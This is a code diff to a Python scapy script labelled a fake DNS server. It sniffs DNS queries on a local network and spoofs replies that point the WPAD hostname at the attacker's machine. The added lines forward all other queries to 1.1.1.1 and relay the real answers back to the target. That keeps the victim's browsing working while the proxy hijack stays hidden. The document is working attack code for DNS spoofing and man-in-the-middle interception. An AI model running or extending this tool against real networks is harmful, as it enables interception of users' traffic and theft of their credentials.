@@ -1,7 +1,7 @@
 from termcolor import cprint
 from scapy.layers.dns import DNS, DNSQR
 from scapy.layers.inet import IP, UDP
-from scapy.sendrecv import sniff, send
+from scapy.sendrecv import sniff, send, sr1
 from scapy.arch import conf
 
 
@@ -28,17 +28,36 @@ def __poison_response(pkt):
 
         cprint(f'Sending spoofed DNS packet: {WPAD_HOSTNAME} = {ATTACKER_IP}')
         send(fake_dns_pkt, verbose=0)
+    else:
+        forward_pkt = IP()/UDP()/DNS()
+        forward_pkt[IP].dst = ALGUM_DNS_SERVER
+        forward_pkt[UDP].sport = pkt[UDP].sport
+        forward_pkt[DNS].rd = 1
+        forward_pkt[DNS].qd = DNSQR(qname=original_qname)
+
+        serverdns_response = sr1(forward_pkt, verbose=0)
+
+        response_pkt = IP()/UDP()/DNS()
+        response_pkt[IP].src = ATTACKER_IP
+        response_pkt[IP].dst = TARGET_IP
+        response_pkt[UDP].dport = pkt[UDP].sport
+        response_pkt[DNS] = serverdns_response[DNS]
+
+        send(response_pkt, verbose=0)
+        
 
 def run(router_ip, target_ip, interface):
     global ATTACKER_IP
     global ROUTER_IP
     global TARGET_IP
     global WPAD_HOSTNAME
+    global ALGUM_DNS_SERVER
 
     ATTACKER_IP = conf.ifaces[interface].ip
     ROUTER_IP = router_ip
     TARGET_IP = target_ip
     WPAD_HOSTNAME = 'wpad.localdomain'
+    ALGUM_DNS_SERVER = '1.1.1.1'
 
     cprint('*** Fake DNS server running ***', 'red', attrs=['blink', 'reverse'])
 
